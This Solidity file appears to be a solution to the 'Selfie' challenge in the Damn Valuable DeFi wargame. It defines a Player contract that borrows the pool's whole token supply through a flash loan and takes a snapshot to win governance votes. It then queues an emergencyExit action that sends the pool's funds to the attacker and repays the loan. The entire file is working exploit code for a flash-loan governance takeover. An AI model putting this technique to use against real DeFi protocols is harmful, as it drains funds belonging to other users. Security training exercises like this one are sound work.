// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";


contract Player is IERC3156FlashBorrower {
    address private immutable me;
    DamnValuableTokenSnapshot private immutable token;
    SimpleGovernance private immutable governance;
    SelfiePool private immutable pool;
    uint private actionId;


    constructor(DamnValuableTokenSnapshot _token, SimpleGovernance _governance, SelfiePool _pool) {
        me = msg.sender;
        token = _token;
        governance = _governance;
        pool = _pool;
    }

    function queueAction() external {
        require(msg.sender == me);
        uint amount = pool.maxFlashLoan(address(token));
        pool.flashLoan(this, address(token), amount, "");
    }

    function executeAction() external {
        console.log("executeAction");
        require(msg.sender == me);
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(initiator == address(this), "Unauthorized");
        require(address(token) == _token);
        console.log("(onFlashLoan)", "amount=", amount);
        console.log("(onFlashLoan)", "token.totalSupply=", token.totalSupply());
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", me);
        console.log("(onFlashLoan)", "data=");
        console.logBytes(data);
        token.snapshot();
        actionId = governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
